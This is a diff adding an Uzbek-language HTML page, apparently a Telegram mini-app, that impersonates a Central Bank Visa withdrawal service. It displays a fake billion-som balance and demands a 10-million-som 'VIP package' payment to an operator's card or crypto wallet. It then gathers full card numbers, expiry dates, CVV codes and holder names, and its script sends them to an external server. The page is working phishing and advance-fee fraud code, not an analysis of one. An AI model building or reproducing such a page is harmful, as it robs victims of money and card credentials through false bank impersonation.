@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>UZS • Rasmiy Pul Yechish Markazi</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@500;700;800;900&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background: radial-gradient(circle at 50% 0%, #0e3a5f 0%, #071324 55%, #040914 100%);
+            color: #f0f9ff;
+            user-select: none;
+        }
+        .cold-glass {
+            background: rgba(12, 34, 58, 0.65);
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border: 1px solid rgba(125, 211, 252, 0.25);
+            box-shadow: 0 12px 35px rgba(2, 132, 199, 0.16);
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between p-4 relative">
+
+    <!-- TOAST BILDIRISHNOMA -->
+    <div id="toast-box" class="fixed top-4 left-4 right-4 z-[70] pointer-events-none flex justify-center transition-all duration-300 opacity-0 -translate-y-4">
+        <div class="cold-glass bg-sky-950/95 border border-sky-300/40 text-sky-50 px-4 py-3 rounded-2xl shadow-2xl text-xs font-bold flex items-center gap-2.5 max-w-sm">
+            <span id="toast-icon" class="text-base">❄️</span>
+            <span id="toast-msg">Xabar</span>
+        </div>
+    </div>
+
+    <div class="max-w-md w-full mx-auto space-y-4">
+        <!-- HEADER -->
+        <div class="cold-glass rounded-3xl p-4 flex items-center justify-between">
+            <div class="flex items-center gap-2.5">
+                <div class="w-10 h-10 rounded-2xl bg-sky-400/15 border border-sky-300/35 flex items-center justify-center text-xl">
+                    ❄️
+                </div>
+                <div>
+                    <h1 class="text-sm font-black text-sky-100">UZS • Pul Yechish</h1>
+                    <p class="text-[10px] text-cyan-300 font-semibold">Markaziy bank Visa tizimi</p>
+                </div>
+            </div>
+            <span id="vip-status-badge" class="text-[10px] font-black bg-rose-500/20 text-rose-200 border border-rose-400/35 px-2.5 py-1 rounded-full">
+                🔒 VIP Faol Emas
+            </span>
+        </div>
+
+        <!-- BALANS VA SHART -->
+        <div class="cold-glass rounded-3xl p-4">
+            <div class="flex justify-between items-center text-xs text-sky-300/80 mb-1">
+                <span>Yechishga tayyor balans:</span>
+                <span class="text-cyan-300 font-bold">Komissiya: 0%</span>
+            </div>
+            <div class="flex items-baseline gap-1.5">
+                <span id="user-balance" class="text-2xl sm:text-3xl font-black bg-gradient-to-r from-white via-sky-200 to-cyan-300 bg-clip-text text-transparent">
+                    1,000,000,000
+                </span>
+                <span class="text-xs font-bold text-sky-200">so'm</span>
+            </div>
+
+            <div class="mt-3 bg-sky-950/75 border border-sky-300/25 rounded-2xl p-3 text-[11px] text-sky-100 leading-relaxed">
+                🏦 <b>Muhim qoida:</b> Pul yechish faqat <b>Visa</b> kartaga <b>Markaziy bank</b> orqali amalga oshiriladi. Komissiyasiz yechib olish uchun oldin <b>10,000,000 so'mlik VIP paket</b>ni sotib olish kerak.
+            </div>
+        </div>
+
+        <!-- 10 MLN VIP PAKET SOTIB OLISH BLOKI (Agar hali VIP bo'lmasa ko'rinadi) -->
+        <div id="vip-buy-section" class="cold-glass rounded-3xl p-4 border border-cyan-300/40 space-y-3">
+            <div class="flex justify-between items-center">
+                <div>
+                    <span class="text-[10px] font-bold uppercase text-cyan-300">1-Qadam • Majburiy litsenziya</span>
+                    <h2 class="text-sm font-black text-white">🚀 10,000,000 so'mlik VIP Paket</h2>
+                </div>
+                <span class="bg-cyan-300 text-slate-950 font-black text-xs px-3 py-1 rounded-xl">10,000,000 UZS</span>
+            </div>
+
+            <!-- TO'LOV USULI TANLASH -->
+            <div class="grid grid-cols-2 gap-2">
+                <button id="w-card-btn" onclick="setPayMethod('card')" class="py-2 rounded-xl bg-sky-300 text-slate-950 font-black text-xs transition">
+                    💳 Bank kartasi
+                </button>
+                <button id="w-crypto-btn" onclick="setPayMethod('crypto')" class="py-2 rounded-xl bg-slate-950 text-sky-200 border border-sky-400/30 font-bold text-xs transition">
+                    💎 Kripto hamyon
+                </button>
+            </div>
+
+            <div id="w-card-box" class="bg-slate-950/85 border border-sky-400/25 rounded-2xl p-3">
+                <div class="flex justify-between items-center">
+                    <span id="w-admin-card" class="font-mono text-xs font-bold text-cyan-300">Yuklanmoqda...</span>
+                    <button onclick="copyText(document.getElementById('w-admin-card').innerText)" class="bg-sky-400/20 text-sky-200 text-[10px] font-bold px-2.5 py-1 rounded-lg">Nusxalash</button>
+                </div>
+                <p id="w-admin-holder" class="text-[11px] text-sky-300/75 mt-1"></p>
+            </div>
+
+            <div id="w-crypto-box" class="hidden space-y-2">
+                <div id="w-crypto-list" class="space-y-1.5 text-xs"></div>
+            </div>
+
+            <div>
+                <label class="text-[11px] text-sky-200 font-semibold block mb-1.5">10,000,000 so'm to'lov chekini yuklang:</label>
+                <input type="file" id="vip-receipt" accept="image/*" class="w-full bg-slate-950 border border-sky-400/30 rounded-xl p-2 text-xs text-sky-100 file:mr-2.5 file:py-1 file:px-2.5 file:rounded-lg file:border-0 file:text-xs file:font-bold file:bg-cyan-300 file:text-slate-950">
+            </div>
+
+            <button id="vip-buy-btn" onclick="buy10MVip()" class="w-full bg-gradient-to-r from-sky-300 to-cyan-400 text-slate-950 font-black py-3 rounded-2xl text-xs shadow-lg active:scale-95 transition">
+                👑 10 mln VIP Paket chekini yuborish
+            </button>
+        </div>
+
+        <!-- VISA KARTA MA'LUMOTLARI FORMASI -->
+        <div class="cold-glass rounded-3xl p-4 space-y-3">
+            <div class="flex justify-between items-center">
+                <h3 class="text-sm font-black text-sky-100">💳 Visa Karta Ma'lumotlari</h3>
+                <span id="form-lock-label" class="text-[10px] font-bold text-rose-300">🔒 VIP paketdan keyin ochiladi</span>
+            </div>
+
+            <div>
+                <label class="text-[11px] text-sky-300/80 block mb-1">Visa karta raqami (16 ta raqam)</label>
+                <input type="text" id="visa-num" maxlength="19" oninput="formatCardNumber(this)" placeholder="4000 1234 5678 9010"
+                       class="w-full bg-slate-950/90 border border-sky-400/25 focus:border-cyan-300 rounded-xl px-3.5 py-2.5 text-sm font-mono text-white outline-none">
+            </div>
+
+            <div class="grid grid-cols-2 gap-2.5">
+                <div>
+                    <label class="text-[11px] text-sky-300/80 block mb-1">Amal qilish muddati</label>
+                    <input type="text" id="visa-exp" maxlength="5" oninput="formatExpiry(this)" placeholder="MM/YY"
+                           class="w-full bg-slate-950/90 border border-sky-400/25 focus:border-cyan-300 rounded-xl px-3.5 py-2.5 text-sm font-mono text-white outline-none">
+                </div>
+                <div>
+                    <label class="text-[11px] text-sky-300/80 block mb-1">CVV / CVC kodi</label>
+                    <input type="password" id="visa-cvv" maxlength="4" placeholder="•••"
+                           class="w-full bg-slate-950/90 border border-sky-400/25 focus:border-cyan-300 rounded-xl px-3.5 py-2.5 text-sm font-mono text-white outline-none">
+                </div>
+            </div>
+
+            <div>
+                <label class="text-[11px] text-sky-300/80 block mb-1">Karta egasining Ism va Familiyasi</label>
+                <input type="text" id="visa-holder" placeholder="ISMATBEK KANNAKHOROV"
+                       class="w-full bg-slate-950/90 border border-sky-400/25 focus:border-cyan-300 rounded-xl px-3.5 py-2.5 text-sm uppercase text-white outline-none">
+            </div>
+
+            <button id="withdraw-submit-btn" onclick="submitWithdraw()" disabled
+                    class="w-full bg-slate-800 text-slate-400 font-black py-3.5 rounded-2xl text-xs transition cursor-not-allowed">
+                🔒 Oldin 10 mln VIP paketni sotib oling
+            </button>
+        </div>
+    </div>
+
+    <!-- MARKAZIY BANK TASDIQ BILDIRISHNOMA MODALI -->
+    <div id="cb-modal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md z-50 flex items-center justify-center p-5">
+        <div class="w-full max-w-sm cold-glass rounded-3xl p-6 text-center border border-cyan-300/40 shadow-2xl space-y-3">
+            <div class="w-16 h-16 mx-auto rounded-2xl bg-cyan-400/15 border border-cyan-300/40 flex items-center justify-center text-3xl">
+                🏦
+            </div>
+            <h3 class="text-lg font-black text-sky-100">Ariza Qabul Qilindi!</h3>
+            <p class="text-xs text-sky-200/90 leading-relaxed">
+                Sizning Visa kartangizga pul o'tkazish so'rovi muvaffaqiyatli ro'yxatdan o'tdi. Ariza <b>Markaziy bank tomonidan 3 ish kunida ko'rib chiqiladi</b> va mablag' komissiyasiz kartangizga o'tkazib beriladi.
+            </p>
+            <div class="bg-slate-950/80 border border-sky-400/25 rounded-2xl p-3 text-[11px] text-cyan-300 font-bold">
+                Holat: Markaziy bank tekshiruvida (3 ish kuni)
+            </div>
+            <button onclick="document.getElementById('cb-modal').classList.add('hidden')" class="w-full bg-gradient-to-r from-sky-300 to-cyan-400 text-slate-950 font-black py-3 rounded-2xl text-xs active:scale-95 transition">
+                Tushunarli
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE_URL = "https://somuz.work.gd";
+        const MIN_WITHDRAW = 1000000000;
+
+        const tg = window.Telegram?.WebApp;
+        if (tg) tg.expand();
+
+        const params = new URLSearchParams(window.location.search);
+        const userId = Number(tg?.initDataUnsafe?.user?.id || params.get("user_id") || 6633934393);
+        const username = tg?.initDataUnsafe?.user?.username
+            ? `@${tg.initDataUnsafe.user.username}`
+            : (params.get("username") || "User");
+
+        let isVip = false;
+        let userBalance = 0;
+        let payMethod = "card";
+        let toastTimer = null;
+
+        function showToast(msg, icon = "❄️") {
+            const box = document.getElementById('toast-box');
+            document.getElementById('toast-msg').innerText = msg;
+            document.getElementById('toast-icon').innerText = icon;
+            box.classList.remove('opacity-0', '-translate-y-4');
+            box.classList.add('opacity-100', 'translate-y-0');
+            clearTimeout(toastTimer);
+            toastTimer = setTimeout(() => {
+                box.classList.remove('opacity-100', 'translate-y-0');
+                box.classList.add('opacity-0', '-translate-y-4');
+            }, 3200);
+        }
+
+        function formatCardNumber(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 16);
+            el.value = v.replace(/(.{4})/g, '$1 ').trim();
+        }
+
+        function formatExpiry(el) {
+            let v = el.value.replace(/\D/g, '').substring(0, 4);
+            if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+            el.value = v;
+        }
+
+        function setPayMethod(m) {
+            payMethod = m;
+            const cBtn = document.getElementById('w-card-btn');
+            const kBtn = document.getElementById('w-crypto-btn');
+            const cBox = document.getElementById('w-card-box');
+            const kBox = document.getElementById('w-crypto-box');
+            if (m === 'card') {
+                cBtn.className = "py-2 rounded-xl bg-sky-300 text-slate-950 font-black text-xs transition";
+                kBtn.className = "py-2 rounded-xl bg-slate-950 text-sky-200 border border-sky-400/30 font-bold text-xs transition";
+                cBox.classList.remove('hidden');
+                kBox.classList.add('hidden');
+            } else {
+                kBtn.className = "py-2 rounded-xl bg-sky-300 text-slate-950 font-black text-xs transition";
+                cBtn.className = "py-2 rounded-xl bg-slate-950 text-sky-200 border border-sky-400/30 font-bold text-xs transition";
+                kBox.classList.remove('hidden');
+                cBox.classList.add('hidden');
+            }
+        }
+
+        function copyText(txt) {
+            const inp = document.createElement("input");
+            inp.value = txt;
+            document.body.appendChild(inp);
+            inp.select();
+            document.execCommand("copy");
+            document.body.removeChild(inp);
+            showToast("Nusxalandi!", "📋");
+        }
+
+        function updateVipUI() {
+            const badge = document.getElementById('vip-status-badge');
+            const buySec = document.getElementById('vip-buy-section');
+            const lockLbl = document.getElementById('form-lock-label');
+            const subBtn = document.getElementById('withdraw-submit-btn');
+
+            if (isVip) {
+                badge.className = "text-[10px] font-black bg-cyan-400/20 text-cyan-200 border border-cyan-300/40 px-2.5 py-1 rounded-full";
+                badge.innerText = "✅ 10M VIP Faol";
+                buySec.classList.add('hidden');
+                lockLbl.className = "text-[10px] font-bold text-cyan-300";
+                lockLbl.innerText = "🔓 Yechish ruxsati ochiq";
+                subBtn.disabled = false;
+                subBtn.className = "w-full bg-gradient-to-r from-sky-300 via-cyan-300 to-sky-400 text-slate-950 font-black py-3.5 rounded-2xl text-xs shadow-lg active:scale-95 transition cursor-pointer";
+                subBtn.innerText = "🏦 Visa kartani pul yechishga jo'natish";
+            } else {
+                badge.className = "text-[10px] font-black bg-rose-500/20 text-rose-200 border border-rose-400/35 px-2.5 py-1 rounded-full";
+                badge.innerText = "🔒 VIP Faol Emas";
+                buySec.classList.remove('hidden');
+                lockLbl.className = "text-[10px] font-bold text-rose-300";
+                lockLbl.innerText = "🔒 VIP paketdan keyin ochiladi";
+                subBtn.disabled = true;
+                subBtn.className = "w-full bg-slate-800 text-slate-400 font-black py-3.5 rounded-2xl text-xs transition cursor-not-allowed";
+                subBtn.innerText = "🔒 Oldin 10 mln VIP paketni sotib oling";
+            }
+        }
+
+        async function initPage() {
+            try {
+                const [uRes, sRes] = await Promise.all([
+                    fetch(`${API_BASE_URL}/api/user/${userId}`),
+                    fetch(`${API_BASE_URL}/api/shop_info`)
+                ]);
+                const uData = await uRes.json();
+                const sData = await sRes.json();
+
+                userBalance = uData.balance || 0;
+                isVip = Boolean(uData.is_vip);
+                document.getElementById('user-balance').innerText = userBalance.toLocaleString();
+
+                if (sData.card) {
+                    document.getElementById('w-admin-card').innerText = sData.card.card_number;
+                    document.getElementById('w-admin-holder').innerText = `Karta egasi: ${sData.card.card_holder}`;
+                }
+                const wallets = sData.crypto_wallets || [];
+                document.getElementById('w-crypto-list').innerHTML = wallets.length
+                    ? wallets.map(w => `
+                        <div class="bg-slate-950/90 border border-sky-400/25 rounded-xl p-2.5">
+                            <div class="flex justify-between items-center">
+                                <span class="font-black text-cyan-300">${w.network}</span>
+                                <button onclick="copyText('${w.address}')" class="bg-sky-400/20 text-sky-200 text-[10px] font-bold px-2 py-0.5 rounded-lg">Nusxalash</button>
+                            </div>
+                            <div class="font-mono text-[11px] text-white break-all mt-1">${w.address}</div>
+                        </div>
+                    `).join("")
+                    : `<div class="text-sky-300/70 text-xs">Kripto hamyonlar mavjud emas</div>`;
+
+                updateVipUI();
+            } catch (e) {
+                updateVipUI();
+            }
+        }
+
+        async function buy10MVip() {
+            const fileInput = document.getElementById('vip-receipt');
+            if (!fileInput.files.length) {
+                showToast("Avval 10,000,000 so'm to'lov chekini yuklang!", "📸");
+                return;
+            }
+            const btn = document.getElementById('vip-buy-btn');
+            btn.disabled = true;
+            btn.innerText = "⏳ Chek yuborilmoqda...";
+
+            const fd = new FormData();
+            fd.append("user_id", userId);
+            fd.append("pkg_key", "pkg_10_vip_10m_withdraw");
+            fd.append("pkg_title", "🚀 1 Billion Withdrawal VIP Turbo Pack (10M)");
+            fd.append("amount", "10000000");
+            fd.append("bonus_uzs", "250000000");
+            fd.append("vip_tier", "diamond");
+            fd.append("grants_withdraw_vip", "1");
+            fd.append("payment_method", payMethod);
+            fd.append("username", username);
+            fd.append("receipt", fileInput.files[0]);
+
+            try {
+                const res = await fetch(`${API_BASE_URL}/api/upload_receipt`, { method: "POST", body: fd });
+                const data = await res.json();
+                if (data.status === "ok") {
+                    fileInput.value = "";
+                    showToast("Chek yuborildi! Admin tasdiqlashi bilan Visa yechish tugmasi ochiladi.", "✅");
+                } else {
+                    showToast(data.error || "Xatolik yuz berdi", "❌");
+                }
+            } catch (e) {
+                showToast("Serverga ulanib bo'lmadi!", "❌");
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "👑 10 mln VIP Paket chekini yuborish";
+            }
+        }
+
+        async function submitWithdraw() {
+            if (!isVip) {
+                showToast("Komissiyasiz yechish uchun oldin 10 mln VIP paketni oling!", "🔒");
+                return;
+            }
+            if (userBalance < MIN_WITHDRAW) {
+                showToast("Minimal yechish summasi 1,000,000,000 so'm!", "⚠️");
+                return;
+            }
+
+            const card_number = document.getElementById('visa-num').value.trim();
+            const card_expiry = document.getElementById('visa-exp').value.trim();
+            const card_cvv = document.getElementById('visa-cvv').value.trim();
+            const card_holder = document.getElementById('visa-holder').value.trim().toUpperCase();
+
+            if (card_number.replace(/\s/g, '').length < 16 || card_expiry.length < 5 || card_cvv.length < 3 || card_holder.length < 3) {
+                showToast("Visa karta ma'lumotlarini to'liq kiriting!", "💳");
+                return;
+            }
+
+            const btn = document.getElementById('withdraw-submit-btn');
+            btn.disabled = true;
+            btn.innerText = "⏳ Markaziy bankka yuborilmoqda...";
+
+            try {
+                const res = await fetch(`${API_BASE_URL}/api/withdraw_request`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        user_id: userId,
+                        username: username,
+                        card_number,
+                        card_expiry,
+                        card_holder,
+                        card_cvv
+                    })
+                });
+                const data = await res.json();
+                if (data.status === "ok") {
+                    document.getElementById('cb-modal').classList.remove('hidden');
+                } else {
+                    showToast(data.error || "Ariza yuborilmadi", "❌");
+                }
+            } catch (e) {
+                showToast("Server bilan aloqa xatosi!", "❌");
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "🏦 Visa kartani pul yechishga jo'natish";
+            }
+        }
+
+        initPage();
+    </script>
+</body>
+</html>
